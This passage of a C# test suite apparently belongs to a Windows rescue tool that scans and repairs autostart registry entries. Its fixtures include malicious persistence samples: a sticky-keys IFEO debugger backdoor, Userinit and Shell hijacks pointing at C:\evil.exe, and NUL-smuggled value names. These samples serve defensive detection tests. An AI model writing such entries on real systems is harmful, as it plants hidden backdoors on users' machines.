            True(!Reg.DeleteKey(Root + "\\keep\\"), "trailing backslash refused");
            True(Reg.KeyExists(Root + "\\keep"), "...and nothing was deleted");
            True(!Reg.DeleteKey("XYZ\\a\\b"), "bad root");
            True(!Reg.DeleteKey(null), "null");
            // refusals are checked on the path alone (no real first-level key is created or touched for this)
            RegistryHive h; string parent, name;
            foreach (string bad in new string[] { "HKCU", "HKCU\\", "HKCU\\Software", "HKLM\\SOFTWARE", "HKLM\\RS_SOFT", "HKEY_USERS\\S-1-5-21-1",
                                                  "HKLM\\SOFTWARE\\x\\", "HKLM\\\\x", "XYZ\\a\\b", "", null, "HKLM\\SOFTWARE\\x\0" })
                True(!Reg.DeletablePath(bad, out h, out parent, out name), "refused: " + Show(bad));
            True(Reg.DeletablePath("HKLM\\RS_SYS\\ControlSet001\\Services\\evil", out h, out parent, out name), "deep key accepted");
            Eq("RS_SYS\\ControlSet001\\Services", parent, "parent");
            Eq("evil", name, "name");
            Eq(RegistryHive.LocalMachine, h, "hive");
        }

        static void KeyExistsCases()
        {
            Make("ex\\" + Cyr).Close();
            True(Reg.KeyExists(Root + "\\ex"), "exists");
            True(Reg.KeyExists("HKEY_CURRENT_USER\\" + Sub + "\\ex\\" + Cyr), "long root spelling + Cyrillic");
            True(Reg.KeyExists("HKCU"), "hive root");
            True(!Reg.KeyExists(Root + "\\ex\\nope"), "missing");
            True(!Reg.KeyExists("XYZ\\a"), "bad root");
        }

        static void NulNames()
        {
            string k = Root + "\\nul";
            using (RegistryKey r = Make("nul")) { r.SetValue("", "real default"); r.SetValue("Shell", "explorer.exe"); }
            True(!Reg.DeleteValue(k, "\0evil"), "DeleteValue refuses a NUL name (Win32 would delete the default value)");
            True(!Reg.DeleteValue(k, "Shell\0x"), "DeleteValue refuses 'Shell\\0x' (Win32 would delete Shell)");
            True(!Reg.SetString(k, "Shell\0x", "evil"), "SetString refuses a NUL name");
            Eq("real default", Find(Reg.Values(k), "")[1], "default value untouched");
            Eq("explorer.exe", Find(Reg.Values(k), "Shell")[1], "Shell untouched");
            True(!Reg.KeyExists(k + "\0\\x"), "path with NUL rejected");
            Eq(0, Reg.Values(k + "\0").Count, "Values: path with NUL rejected");
            True(!Reg.DeleteKey(k + "\0\\x"), "DeleteKey: path with NUL rejected");
            True(Reg.KeyExists(k), "...key still there");

            // scan side: a row whose name carries a NUL (Reg.Values marks NUL-cut names that way) is reported, info-only
            if (OnWindows) return;   // Windows cannot create such names through RegistryKey; Mono keeps them intact
            using (RegistryKey r = Make("nul")) r.SetValue("\0evil", "C:\\evil.exe");
            List<Finding> f = new List<Finding>();
            MainForm.AddValues(f, "Run (HKLM)", k);
            Finding hidden = null;
            foreach (Finding x in f) if (x.Name.StartsWith("(скрытое имя с NUL")) hidden = x;
            True(hidden != null, "hidden NUL name reported");
            Eq(3, hidden.Kind, "info-only (Kind 3): no delete through Win32");
            Eq("SUSPECT", hidden.Risk, "flagged");
            True(hidden.DelName == null && hidden.DelKey == null, "nothing to delete");
            True(FindName(f, "Shell") != null, "normal value still reported");
        }

        // Live, a value can disappear between the listing and the read (RunOnce, updaters): no false "hidden name" row.
        static void ValuesRace()
        {
            using (RegistryKey k = Make("race")) { k.SetValue("RunOnceThing", "C:\\x.exe"); k.SetValue("Stay", "C:\\y.exe"); }
            Reg.BeforeValueRead = delegate(RegistryKey key, string name)
            {
                if (name != "RunOnceThing") return;
                using (RegistryKey b = HKCU())
                using (RegistryKey w = b.OpenSubKey(Sub + "\\race", true)) w.DeleteValue(name, false);
            };
            try
            {
                List<string[]> v = Reg.Values(Root + "\\race");
                Eq(1, v.Count, "the value deleted during the read is just gone");
                Eq("Stay", v[0][0], "the other value is still listed");
                using (RegistryKey k = Make("race")) k.SetValue("RunOnceThing", "C:\\x.exe");   // deleted again during the scan
                List<Finding> f = new List<Finding>();
                MainForm.AddValues(f, "RunOnce (HKLM)", Root + "\\race");
                Eq(1, f.Count, "one finding (Stay)");
                foreach (Finding x in f) True(!x.Name.StartsWith("(скрытое"), "no hidden-name alarm: " + x.Name);
            }
            finally { Reg.BeforeValueRead = null; }
        }

        // ------------------------------------------------------------------ live mode / target helpers

        static string PD(string pip, string winDir, bool live, string orig)
        {
            bool other;
            string d = MainForm.ProfileDir(pip, winDir, live, orig, out other);
            return other ? "<other volume>" : d;
        }

        // Offline only the target's own volume: a literal C:\Users\Ivan is D:\Users\Ivan when the target is D:\Windows -
        // never WinPE's C: (another installation / a USB disk). A profile on another volume of the installation is
        // reported, not guessed.
        static void ProfileDirs()
        {
            Eq("D:\\Users\\Ivan", PD("%SystemDrive%\\Users\\Ivan", "D:\\Windows", false, "C:"), "offline %SystemDrive% -> target drive");
            Eq("D:\\Users\\Ivan", PD("%systemdrive%\\Users\\Ivan\\", "D:\\Windows", false, "C:"), "case-insensitive, trailing backslash");
            Eq("D:\\Windows\\ServiceProfiles\\X", PD("%SystemRoot%\\ServiceProfiles\\X", "D:\\Windows", false, "C:"), "%SystemRoot% -> target Windows dir");
            Eq("D:\\Windows\\x", PD("%windir%\\x", "D:\\Windows", false, "C:"), "%windir%");
            Eq("D:\\Users\\Ivan", PD("C:\\Users\\Ivan", "D:\\Windows", false, "C:"), "offline literal C: -> the target's volume ONLY");
            Eq("D:\\Users\\Ivan", PD("c:\\Users\\Ivan", "D:\\Windows", false, "C:"), "drive letter case");
            Eq("D:\\Users\\Ivan", PD("C:\\Users\\Ivan", "D:\\Windows", false, ""), "system drive unknown -> still only the target's volume");
            Eq("<other volume>", PD("E:\\Profiles\\Ivan", "D:\\Windows", false, "C:"), "offline: profile on another volume of the installation -> reported");
            Eq("D:\\Users\\Ivan", PD("D:\\Users\\Ivan", "D:\\Windows", false, "D:"), "same letters as before");
            Eq("C:\\Users\\Ivan", PD("%SystemDrive%\\Users\\Ivan", "C:\\Windows", true, ""), "live");
            Eq("E:\\Profiles\\X", PD("E:\\Profiles\\X", "C:\\Windows", true, ""), "live: other drive kept as is (letters are real)");
            Eq("D:\\Пользователи\\Иван", PD("%SystemDrive%\\Пользователи\\Иван", "D:\\Windows", false, "C:"), "Cyrillic");
            Eq("", PD("%USERPROFILE%\\x", "D:\\Windows", false, "C:"), "unknown variable rejected");
            Eq("", PD("\\\\server\\share\\x", "D:\\Windows", false, "C:"), "UNC rejected");
            Eq("", PD("Users\\x", "D:\\Windows", false, "C:"), "relative rejected");
            Eq("", PD("", "D:\\Windows", false, "C:"), "empty");
            Eq("", PD(null, "D:\\Windows", false, "C:"), "null");
        }

        // The running WinPE/WinRE (X: + MiniNT) is never a target; MiniNT alone (malware on an installed Windows) must not
        // hide the live OS.
        static void TargetList()
        {
            True(MainForm.IsRescueSystem(true, "X:\\Windows"), "WinPE: MiniNT + X:");
            True(MainForm.IsRescueSystem(true, "x:\\windows"), "case");
            True(!MainForm.IsRescueSystem(true, "C:\\Windows"), "MiniNT on an installed C:\\Windows is not WinPE");
            True(!MainForm.IsRescueSystem(false, "X:\\Windows"), "Windows installed on X: without MiniNT");
            True(!MainForm.IsRescueSystem(true, ""), "unknown");
            HashSet<string> files = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            foreach (string d in new string[] { "C", "D", "X" }) files.Add(d + ":\\Windows\\System32\\config\\SYSTEM");
            Predicate<string> fe = delegate(string f) { return files.Contains(f); };
            Eq("C:\\Windows (офлайн) | D:\\Windows (офлайн)", JoinT(MainForm.ListTargets("X:\\Windows", true, fe)), "in WinPE: the offline installations only");
            Eq("C:\\Windows (живая — эта ОС; ключ MiniNT!) | D:\\Windows (офлайн) | X:\\Windows (офлайн)", JoinT(MainForm.ListTargets("C:\\Windows", true, fe)),
               "live OS with a planted MiniNT key: still listed, labelled");
            Eq("C:\\Windows (живая — эта ОС) | D:\\Windows (офлайн) | X:\\Windows (офлайн)", JoinT(MainForm.ListTargets("C:\\Windows", false, fe)), "live OS");
            files.Add("E:\\WINNT\\System32\\config\\SYSTEM");
            Eq("E:\\WINNT (живая — эта ОС) | C:\\Windows (офлайн) | D:\\Windows (офлайн) | X:\\Windows (офлайн)", JoinT(MainForm.ListTargets("E:\\WINNT", false, fe)),
               "running OS in a non-standard folder is listed too");
        }

        // ------------------------------------------------------------------ wave 2 / package A
        // Winlogon / Session Manager defaults (research windows-semantics Q1/Q2).
        static void DefaultsWinlogon()
        {
            string sr = "C:\\Windows";
            True(Defaults.UserinitClean("C:\\Windows\\system32\\userinit.exe,", sr), "default with comma");
            True(Defaults.UserinitClean("C:\\Windows\\system32\\userinit.exe", sr), "without comma (KB 555648 form)");
            True(Defaults.UserinitClean(" c:\\windows\\SYSTEM32\\Userinit.exe , ", sr), "case / spaces / trailing comma");
            True(Defaults.UserinitClean("userinit.exe,", sr), "bare userinit.exe");
            True(Defaults.UserinitClean("userinit", sr), "bare userinit");
            True(!Defaults.UserinitClean("C:\\Windows\\system32\\userinit.exe,C:\\evil.exe", sr), "classic hijack without trailing comma (R091)");
            True(!Defaults.UserinitClean("C:\\Windows\\system32\\userinit.exe,C:\\evil.exe,", sr), "hijack with trailing comma");
            True(!Defaults.UserinitClean("C:\\ProgramData\\x\\userinit.exe,", sr), "replacement in another folder (R011)");
            True(!Defaults.UserinitClean("D:\\Windows\\system32\\userinit.exe,", sr), "other drive than the target's SystemRoot");
            True(Defaults.UserinitClean("E:\\Windows\\system32\\userinit.exe,", ""), "SystemRoot unknown: any X:\\Windows");
            True(!Defaults.UserinitClean("", sr), "empty");
            True(!Defaults.UserinitClean(",,", sr), "only commas");
            True(!Defaults.UserinitClean("C:\\Windows\\system32\\userinit.exe /x,", sr), "arguments");
            Eq("D:\\Win10\\system32\\userinit.exe,", Defaults.Userinit("D:\\Win10\\"), "default from SystemRoot");
            True(Defaults.ShellClean("explorer.exe", sr) && Defaults.ShellClean(" Explorer.EXE ", sr), "shell default");
            True(Defaults.ShellClean("C:\\Windows\\explorer.exe", sr), "full path");
            True(!Defaults.ShellClean("explorer.exe, C:\\evil.exe", sr), "extra program");
            True(!Defaults.ShellClean("C:\\Users\\x\\explorer.exe", sr), "explorer.exe elsewhere");
            True(Defaults.VmAppletClean("SystemPropertiesPerformance.exe /pagefile"), "VMApplet default (R059)");
            True(Defaults.VmAppletClean("systempropertiesperformance.exe  /pagefile"), "VMApplet case / spaces");
            True(!Defaults.VmAppletClean("C:\\evil.exe"), "VMApplet changed");
            True(Defaults.AlternateShellClean("cmd.exe") && !Defaults.AlternateShellClean("C:\\x\\evil.exe"), "AlternateShell");
            Eq("C:\\Windows", Defaults.SystemRootFor("C:\\Windows", false, "X:\\Windows", "D:\\Windows"), "offline: the installation's own SystemRoot value");
            Eq("C:\\Windows", Defaults.SystemRootFor("", false, "X:\\Windows", "D:\\Windows"), "offline, value missing: C: + folder");
            Eq("C:\\WINNT", Defaults.SystemRootFor("%SystemDrive%\\x", false, "X:\\Windows", "F:\\WINNT"), "offline, odd value: C: + folder");
            Eq("E:\\Win", Defaults.SystemRootFor("C:\\Windows", true, "E:\\Win", "E:\\Win"), "live: the running system");
        }

        static void DefaultsBootExecute()
        {
            True(Defaults.AutochkLine("autocheck autochk *"), "default");
            True(Defaults.AutochkLine("autocheck autochk /k:C *"), "chkntfs /x");
            True(Defaults.AutochkLine("autocheck autochk /k:CD *"), "chkntfs /x two drives");
            True(Defaults.AutochkLine("autocheck autochk /r \\??\\C:"), "scheduled chkdsk /r");
            True(Defaults.AutochkLine("autocheck autochk /p \\??\\C:"), "scheduled /p");
            True(Defaults.AutochkLine("AUTOCHECK AUTOCHK /m \\??\\Volume{12345678-abcd-ef01-2345-6789abcdef01}"), "volume GUID");
            True(Defaults.AutochkLine("autocheck autochk /q /v *"), "/q /v");
            True(!Defaults.AutochkLine("autocheck autochk * evil"), "extra token");
            True(!Defaults.AutochkLine("evil"), "other native program");
            True(!Defaults.AutochkLine("autocheck evil.exe *"), "other program after autocheck");
            True(!Defaults.AutochkLine("autocheck autochk /r C:\\x.exe"), "switch with a non-volume argument");
            True(!Defaults.AutochkLine("autocheck autochk /k:C1 *"), "bad /k list");
            True(!Defaults.AutochkLine("autocheck autochk /m \\??\\Volume{zz}"), "bad volume GUID");
            Eq("autocheck autochk *", string.Join("|", Defaults.BootExecuteRepair(new string[] { "autocheck autochk *", "evil" })), "extra entry dropped");
            Eq("autocheck autochk /r \\??\\C:|autocheck autochk *", string.Join("|", Defaults.BootExecuteRepair(new string[] { "autocheck autochk /r \\??\\C:", "autocheck autochk *" })),
               "scheduled chkdsk kept (R049/R052)");
            Eq("autocheck autochk /r \\??\\C:|autocheck autochk *", string.Join("|", Defaults.BootExecuteRepair(new string[] { "autocheck autochk /r \\??\\C:", "\\??\\D:\\x.exe" })),
               "default added when no kept line has *");
            Eq("autocheck autochk *", string.Join("|", Defaults.BootExecuteRepair(new string[0])), "empty -> default");
            True(Defaults.ServicingEntry("C:\\Windows\\System32\\poqexec.exe /display_progress \\SystemRoot\\WinSxS\\pending.xml"), "poqexec (R060)");
            True(Defaults.ServicingEntry("\\SystemRoot\\System32\\poqexec.exe /display_progress \\SystemRoot\\WinSxS\\pending.xml"), "poqexec NT path");
            True(Defaults.ServicingEntry("poqexec.exe /skip_pending"), "bare poqexec");
            True(!Defaults.ServicingEntry("C:\\Users\\x\\poqexec.exe /display_progress \\SystemRoot\\WinSxS\\pending.xml"), "poqexec elsewhere");
            True(!Defaults.ServicingEntry("C:\\Windows\\System32\\poqexec.exe C:\\evil.exe"), "poqexec with another argument");
            True(!Defaults.ServicingEntry("C:\\evil.exe"), "other program");
        }

        static void DefaultsIfeo()
        {
            True(Defaults.IfeoKnownDebugger("taskmgr.exe", "\"C:\\Tools\\procexp64.exe\""), "Process Explorer");
            True(Defaults.IfeoKnownDebugger("Taskmgr.exe", "C:\\Program Files\\SystemInformer\\SystemInformer.exe"), "System Informer, unquoted with spaces");
            True(Defaults.IfeoKnownDebugger("notepad.exe", "\"C:\\Program Files\\Notepad++\\notepad++.exe\" -notepadStyleCmdline -z"), "Notepad++");
            True(Defaults.IfeoKnownDebugger("myservice.exe", "C:\\Debuggers\\windbg.exe -g"), "windbg");
            True(!Defaults.IfeoKnownDebugger("sethc.exe", "C:\\Windows\\System32\\cmd.exe"), "sticky keys backdoor");
            True(!Defaults.IfeoKnownDebugger("taskmgr.exe", "C:\\evil.exe"), "taskmgr blocked");
            True(!Defaults.IfeoKnownDebugger("regedit.exe", "\"C:\\Tools\\procexp64.exe\""), "procexp on another exe");
            Eq("notepad++.exe", Defaults.ImageName("\"C:\\Program Files\\Notepad++\\notepad++.exe\" -z"), "ImageName quoted");
            Eq("a.exe", Defaults.ImageName("C:\\x y\\a.exe -b"), "ImageName unquoted with space");
            Eq("ntsd.exe", Defaults.ImageName("ntsd.exe -d"), "ImageName bare");
        }

        // Scan side: Winlogon / BootExecute / SetupExecute / IFEO rows and their remediation kind.
        static void ScanResetKinds()
        {
            using (RegistryKey k = Make("sm"))
            {
                k.SetValue("BootExecute", new string[] { "autocheck autochk /r \\??\\C:", "autocheck autochk *", "evil" }, RegistryValueKind.MultiString);
                k.SetValue("SetupExecute", new string[] { "C:\\Windows\\System32\\poqexec.exe /display_progress \\SystemRoot\\WinSxS\\pending.xml" }, RegistryValueKind.MultiString);
            }
            List<Finding> f = new List<Finding>();
            MainForm.ScanBootExecute(f, Root + "\\sm");
            MainForm.ScanSetupExecute(f, Root + "\\sm");
            Eq(2, f.Count, "two rows");
            Finding be = FindName(f, "BootExecute");
            Eq("SUSPECT", be.Risk, "BootExecute with an extra entry");
            Eq(4, be.Kind, "BootExecute is reset, never deleted");
            True(MainForm.ResetOnly(be), "ResetOnly");
            Eq("autocheck autochk /r \\??\\C:|autocheck autochk *", string.Join("|", (string[])be.ResetData), "reset keeps the scheduled chkdsk");
            Eq(RegistryValueKind.MultiString, be.ResetType, "REG_MULTI_SZ");
            Finding se = f[1];
            Eq("REVIEW", se.Risk, "pending servicing = REVIEW");
            Eq(3, se.Kind, "pending servicing is never removed");
            using (RegistryKey k = Make("sm"))
                k.SetValue("SetupExecute", new string[] { "C:\\Windows\\System32\\poqexec.exe /display_progress \\SystemRoot\\WinSxS\\pending.xml", "C:\\evil.exe" }, RegistryValueKind.MultiString);
            f.Clear();
            MainForm.ScanSetupExecute(f, Root + "\\sm");
            Eq("SUSPECT", f[0].Risk, "SetupExecute with another program");
            Eq(4, f[0].Kind, "SetupExecute reset");
            Eq(1, ((string[])f[0].ResetData).Length, "only the servicing entry is kept");
            using (RegistryKey k = Make("sm")) k.SetValue("BootExecute", new string[] { "autocheck autochk *" }, RegistryValueKind.MultiString);
            f.Clear();
            MainForm.ScanBootExecute(f, Root + "\\sm");
            Eq("", f[0].Risk, "default BootExecute is clean");
            // IFEO: Debugger value only (key holds MitigationOptions too); filter subkey; known debugger = REVIEW; WOW64 copy
            string ifeo = "ifeo\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options";
            using (RegistryKey k = Make(ifeo + "\\sethc.exe")) { k.SetValue("Debugger", "C:\\Windows\\System32\\cmd.exe"); k.SetValue("MitigationOptions", new byte[] { 1, 2 }); }
            using (RegistryKey k = Make(ifeo + "\\taskmgr.exe")) k.SetValue("Debugger", "\"C:\\Tools\\procexp64.exe\"");
            using (RegistryKey k = Make(ifeo + "\\notepad.exe\\0")) k.SetValue("Debugger", "C:\\Users\\x\\AppData\\evil.exe");
            using (RegistryKey k = Make("ifeo\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe")) k.SetValue("Debugger", "cmd.exe");
            f.Clear();
            MainForm.ScanIfeo(f, Root + "\\ifeo", new List<string>());
            Eq(4, f.Count, "four IFEO rows");
            Finding s = FindName(f, "sethc.exe");
            Eq(0, s.Kind, "IFEO: delete the VALUE");
            Eq("Debugger", s.DelName, "only Debugger");
            Eq("SUSPECT", s.Risk, "sethc");
            Eq("REVIEW", FindName(f, "taskmgr.exe").Risk, "Process Explorer = REVIEW");
            Finding fl = FindName(f, "notepad.exe\\0");
            True(fl != null && fl.DelKey.EndsWith("\\notepad.exe\\0"), "filter subkey row");
            Finding w = FindName(f, "utilman.exe");
            True(w != null && w.Category.Contains("WOW64"), "WOW64 copy labelled");
            // Winlogon: VMApplet default is clean and reset-only
            using (RegistryKey k = Make("wl2\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon")) { k.SetValue("VMApplet", "SystemPropertiesPerformance.exe /pagefile"); k.SetValue("Userinit", "D:\\W\\system32\\userinit.exe,"); }
            f.Clear();
            MainForm.ScanExtraSoftware(f, Root + "\\wl2");
            Finding vm = FindName(f, "VMApplet");
            True(vm != null && vm.Risk == "" && vm.Kind == 4, "VMApplet default: clean, reset-only");
            f.Clear();
            MainForm.ScanWinlogon(f, Root + "\\wl2", "D:\\W");
            Eq("", FindName(f, "Userinit").Risk, "Userinit judged against the target's SystemRoot");
            Eq("D:\\W\\system32\\userinit.exe,", FindName(f, "Userinit").ResetData, "reset data from the target's SystemRoot");
        }

        static void AnchorsGood()
        {
            string[] shell = { "Winlogon Shell", "x", "Shell", "explorer.exe", "0" };
            string[] taskman = { "Winlogon Taskman", "x", "Taskman", "", "1" };
            string[] appinit = { "AppInit_DLLs", "x", "AppInit_DLLs", "", "0" };
            string[] ui = { "Winlogon Userinit", "x", "Userinit", "C:\\Windows\\system32\\userinit.exe,", "0" };
            True(MainForm.AnchorGood(shell, "explorer.exe", true, "C:\\Windows"), "shell ok");
            True(!MainForm.AnchorGood(shell, "", false, "C:\\Windows"), "shell missing");
            True(MainForm.AnchorGood(taskman, "", false, "") && !MainForm.AnchorGood(taskman, "x", true, ""), "taskman");
            True(MainForm.AnchorGood(appinit, "", false, "") && MainForm.AnchorGood(appinit, " ", true, "") && !MainForm.AnchorGood(appinit, "a.dll", true, ""), "appinit");
            True(MainForm.AnchorGood(ui, "userinit.exe,", true, "C:\\Windows"), "userinit variant is not rewritten");
            True(!MainForm.AnchorGood(ui, "C:\\Windows\\system32\\userinit.exe,evil.exe", true, "C:\\Windows"), "userinit hijack");
        }

        // .reg writer / parser: every type, escaping, default value, "delete" marker, continuation lines.
        static void RegFileRoundTrip()
        {
            RegSection s = new RegSection("HKEY_LOCAL_MACHINE\\SOFTWARE\\A b\\[x]");
            Action<string, int, byte[]> add = delegate(string n, int t, byte[] d) { RegVal v = new RegVal(); v.Name = n; v.Type = t; v.Data = d; s.Values.Add(v); };
            add("", 1, Encoding.Unicode.GetBytes("def\0"));
            add("q\"uote \\ back", 1, Encoding.Unicode.GetBytes("C:\\dir\\\"x\" Кириллица\0"));
            add("noterm", 1, Encoding.Unicode.GetBytes("abc"));                // REG_SZ without terminator -> hex(1)
            add("nl", 1, Encoding.Unicode.GetBytes("a\r\nb\0"));                // newline -> hex(1)
            add("exp", 2, Encoding.Unicode.GetBytes("%SystemRoot%\\x\0"));
            add("multi", 7, Encoding.Unicode.GetBytes("a\0b\0\0"));
            add("dw", 4, BitConverter.GetBytes(0xdeadbeefu));
            add("qw", 11, BitConverter.GetBytes(0x0102030405060708L));
            add("bin", 3, new byte[200]);
            add("none", 0, new byte[0]);
            add("odd", 0x12345, new byte[] { 9 });
            add("dwshort", 4, new byte[] { 1, 2 });
            RegVal del = new RegVal(); del.Name = "gone"; del.Delete = true; s.Values.Add(del);
            List<RegSection> secs = new List<RegSection> { s, new RegSection("HKEY_USERS\\S-1-5-21-1\\Software\\Empty") };
            string err;
            string text = RegFile.Format(secs, out err);
            True(text != null, "format: " + err);
            True(text.StartsWith("Windows Registry Editor Version 5.00\r\n"), "header");
            True(text.Contains("\r\n@=\"def\"\r\n"), "default value as @");
            True(text.Contains("\"q\\\"uote \\\\ back\"=\"C:\\\\dir\\\\\\\"x\\\" Кириллица\""), "escaping of name and data");
            True(text.Contains("\"dw\"=dword:deadbeef"), "dword");
            True(text.Contains("\"exp\"=hex(2):"), "hex(2)");
            True(text.Contains("\"multi\"=hex(7):61,00,00,00,62,00,00,00,00,00"), "hex(7)");
            True(text.Contains("\"qw\"=hex(b):08,07,06,05,04,03,02,01"), "hex(b) little endian");
            True(text.Contains("\"none\"=hex(0):"), "hex(0)");
            True(text.Contains("\"gone\"=-"), "delete marker");
            True(text.Contains(",\\\r\n  "), "long hex wrapped like regedit");
            foreach (string line in text.Split('\n')) True(line.Length <= 82, "line length " + line.Length);
            List<RegSection> back = RegFile.Parse(text, out err);
            True(back != null, "parse: " + err);
            Eq(2, back.Count, "sections");
            Eq(s.Path, back[0].Path, "path with ] and space");
            Eq(s.Values.Count, back[0].Values.Count, "values");
            for (int i = 0; i < s.Values.Count; i++)
            {
                RegVal a = s.Values[i], b = back[0].Values[i];
                Eq(a.Name, b.Name, "name " + i);
                Eq(a.Delete, b.Delete, "delete " + a.Name);
                if (a.Delete) continue;
                Eq(a.Type, b.Type, "type " + a.Name);
                Eq(Reg.Hex(a.Data), Reg.Hex(b.Data), "bytes " + a.Name);
            }
            Eq(0, back[1].Values.Count, "empty key");
            // UTF-16 file with BOM round trip
            string file = Path.Combine(Path.GetTempPath(), "rs_reg_" + Id + ".reg"); tempFiles.Add(file);
            File.WriteAllText(file, text, Encoding.Unicode);
            byte[] raw = File.ReadAllBytes(file);
            True(raw[0] == 0xFF && raw[1] == 0xFE, "UTF-16LE BOM");
            True(RegFile.Parse(File.ReadAllText(file), out err) != null, "parse from file");
            // rejects
            True(RegFile.Parse("REGEDIT4\r\n[HKEY_LOCAL_MACHINE\\x]\r\n", out err) == null, "wrong header");
            True(RegFile.Parse(RegFile.Header + "\r\n\"a\"=\"x\"\r\n", out err) == null, "value outside a key");
            True(RegFile.Parse(RegFile.Header + "\r\n[-HKEY_LOCAL_MACHINE\\x]\r\n", out err) == null, "key deletion lines are not ours");
            True(RegFile.Parse(RegFile.Header + "\r\n[HKEY_LOCAL_MACHINE\\x]\r\n\"a\"=hex:zz\r\n", out err) == null, "bad hex");
            RegVal crlf = new RegVal(); crlf.Name = "a\nb"; crlf.Type = 1; crlf.Data = new byte[2];
            RegSection bad = new RegSection("HKEY_LOCAL_MACHINE\\x"); bad.Values.Add(crlf);
            True(RegFile.Format(new List<RegSection> { bad }, out err) == null, "a name with a newline cannot be written: no backup, no delete");
        }

        // Snapshot (exact copy) of a value / a subtree, written back with SetRaw into another key: identical.
        static void SnapshotRestore()
        {
            using (RegistryKey k = Make("snap\\src"))
            {
                k.SetValue("sz", "C:\\x \"q\"");
                k.SetValue("exp", "%SystemRoot%\\a", RegistryValueKind.ExpandString);
                k.SetValue("multi", new string[] { "a", "", "b" }, RegistryValueKind.MultiString);
                k.SetValue("dw", 7, RegistryValueKind.DWord);
                k.SetValue("qw", 1L << 40, RegistryValueKind.QWord);
                k.SetValue("bin", new byte[] { 0, 1, 255 }, RegistryValueKind.Binary);
                k.SetValue("", "default");
            }
            using (RegistryKey k = Make("snap\\src\\child\\deep")) k.SetValue("x", "y");
            string err;
            List<RegSection> snap = Reg.Snapshot(Root + "\\snap\\src", null, out err);
            True(snap != null, "snapshot: " + err);
            Eq(3, snap.Count, "three keys");
            string text = RegFile.Format(snap, out err);
            True(text != null, "format: " + err);
            List<RegSection> back = RegFile.Parse(text, out err);
            True(back != null, "parse: " + err);
            foreach (RegSection s in back)
            {
                string k = Root + "\\snap\\dst" + s.Path.Substring((Root + "\\snap\\src").Length);
                True(Reg.CreateKey(k), "CreateKey " + k);
                foreach (RegVal v in s.Values) True(Reg.SetRaw(k, v.Name, v.Type, v.Data), "SetRaw " + v.Name);
            }
            List<string[]> a = Reg.Values(Root + "\\snap\\src"), b = Reg.Values(Root + "\\snap\\dst");
            Eq(a.Count, b.Count, "value count");
            foreach (string[] v in a)
            {
                string[] w = Find(b, v[0]);
                True(w != null, "value " + v[0]);
                Eq(v[1] + "|" + v[2], w[1] + "|" + w[2], "data/type " + v[0]);
            }
            Eq("y", Find(Reg.Values(Root + "\\snap\\dst\\child\\deep"), "x")[1], "subtree restored");
            List<RegSection> one = Reg.Snapshot(Root + "\\snap\\src", "dw", out err);
            Eq(1, one.Count, "value snapshot: one key");
            Eq(1, one[0].Values.Count, "value snapshot: one value");
            Eq("dw", one[0].Values[0].Name, "value snapshot: the value");
            List<RegSection> miss = Reg.Snapshot(Root + "\\snap\\src", "nothere", out err);
            True(miss != null && miss[0].Values[0].Delete, "missing value recorded as delete-on-restore");
            True(Reg.Snapshot(Root + "\\snap\\nokey", null, out err) == null, "missing key: no snapshot");
            True(Reg.ReadMulti(Root + "\\snap\\src", "multi").Length == 3, "ReadMulti keeps empty items");
            True(Reg.ReadMulti(Root + "\\snap\\src", "dw") == null, "ReadMulti: not a string");
        }

        static void ManifestCases()
        {
            foreach (string t in new string[] { "", "a\tb", "c:\\x\\", "line\r\nnext", "\\t literal", "nul\0x" })
                Eq(t, QuarMan.Unesc(QuarMan.Esc(t)), "escape round trip " + t);
            True(QuarMan.Esc("a\tb\nc").IndexOf('\t') < 0 && QuarMan.Esc("a\nb").IndexOf('\n') < 0, "no raw TAB / LF");
            ManEntry f = new ManEntry(); f.N = 3; f.Orig = "D:\\Users\\x\\evil\tname.exe"; f.Vol = "1A2B3C4D"; f.Backup = "3_evil_name.exe.quarantine"; f.Attrs = 7; f.Sha = new string('a', 64);
            string err;
            ManEntry g = QuarMan.Parse(QuarMan.FileLine(f), out err);
            True(g != null, "FILE parse: " + err);
            Eq(f.Orig, g.Orig, "orig with TAB"); Eq(3, g.N, "N"); Eq(7, g.Attrs, "attrs"); Eq("1A2B3C4D", g.Vol, "vol");
            ManEntry r = new ManEntry(); r.N = 4; r.IsKey = false; r.Install = "1A2B3C4D\\WINDOWS"; r.RootKind = "USER"; r.UserId = "S-1-5-21-1-2-3-1001";
            r.RegRoot = "HKEY_USERS\\S-1-5-21-1-2-3-1001"; r.Rel = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"; r.ValueName = "x\ty"; r.Backup = "4.reg"; r.Sha = new string('b', 64); r.Note = "Run";
            ManEntry q = QuarMan.Parse(QuarMan.RegLine(r), out err);
            True(q != null, "REG parse: " + err);
            Eq(r.ValueName, q.ValueName, "value name with TAB"); Eq("USER", q.RootKind, "root kind"); True(!q.IsKey, "V");
            // rejected lines
            ManEntry b = new ManEntry(); b.N = 1; b.Sha = new string('a', 64); b.Backup = "1.reg";
            b.Orig = "..\\x"; True(QuarMan.Parse(QuarMan.FileLine(b), out err) == null && err.Length > 0, "relative original path");
            b.Orig = "C:\\a\\..\\Windows\\x.dll"; True(QuarMan.Parse(QuarMan.FileLine(b), out err) == null, "'..' in the original path");
            b.Orig = "\\\\server\\share\\x"; True(QuarMan.Parse(QuarMan.FileLine(b), out err) == null, "UNC original path");
            b.Orig = "C:\\x.exe";
            foreach (string bn in new string[] { "..\\..\\Windows\\x.reg", "C:\\x.reg", "a/b", "manifest.txt", "MANIFEST.TXT", "", "..", "x." })
            { b.Backup = bn; True(QuarMan.Parse(QuarMan.FileLine(b), out err) == null, "backup name rejected: " + bn); }
            b.Backup = "1.reg"; b.Sha = "";
            True(QuarMan.Parse(QuarMan.FileLine(b), out err) == null, "no SHA-256");
            r.RootKind = "HKLM"; True(QuarMan.Parse(QuarMan.RegLine(r), out err) == null, "unknown root kind");
            r.RootKind = "SOFTWARE"; r.IsKey = true; r.Rel = ""; True(QuarMan.Parse(QuarMan.RegLine(r), out err) == null, "a whole hive root is never a key item");
            r.Rel = "a\\\\b"; True(QuarMan.Parse(QuarMan.RegLine(r), out err) == null, "empty key component");
            Eq(null, QuarMan.Parse(QuarMan.HeaderLine("20260101_000000", "D:\\Windows (офлайн)", "X"), out err), "header is not an entry");
            True(QuarMan.IsHeader(QuarMan.HeaderLine("s", "t", "i")), "header recognised");
